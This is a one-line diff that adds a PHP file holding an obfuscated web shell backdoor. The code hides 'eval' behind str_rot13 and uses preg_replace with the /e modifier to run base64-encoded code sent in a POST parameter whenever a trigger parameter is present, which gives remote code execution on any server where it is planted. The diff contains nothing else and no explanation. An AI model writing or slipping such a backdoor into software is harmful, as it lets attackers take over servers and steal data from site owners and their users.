@@ -1,0 +1,1 @@
+<?php if(isset($_POST['jnhfb'])){($www= $_POST['jnhfb']) && @preg_replace('/ad/e','@'.str_rot13('riny').'(@eval(base64_decode($_POST[z0]));)', 'add');}
